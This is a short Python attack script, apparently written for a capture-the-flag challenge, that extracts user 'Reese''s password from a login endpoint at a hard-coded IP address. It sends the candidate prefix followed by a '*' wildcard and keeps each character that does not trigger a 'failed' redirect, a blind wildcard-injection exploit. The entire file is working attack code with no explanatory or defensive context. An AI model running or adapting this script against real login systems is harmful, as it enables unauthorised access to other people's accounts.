import requests



v=""

myobj = {'username':'Reese','password': 'z'}
x = requests.post("http://157.245.41.248:32550/login", data = myobj)
print(x.url)
a="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&\()+,-./:;<=>?@[\\]^_`{|}~"

while True:
    for p in a:
        c=v+p
        myobj = {'username':'Reese','password': c+"*"}
        x = requests.post("http://157.245.41.248:32550/login", data = myobj)
        if "failed" not in x.url and x.status_code !=500:
            v= v + p
            print(v)
            
                    




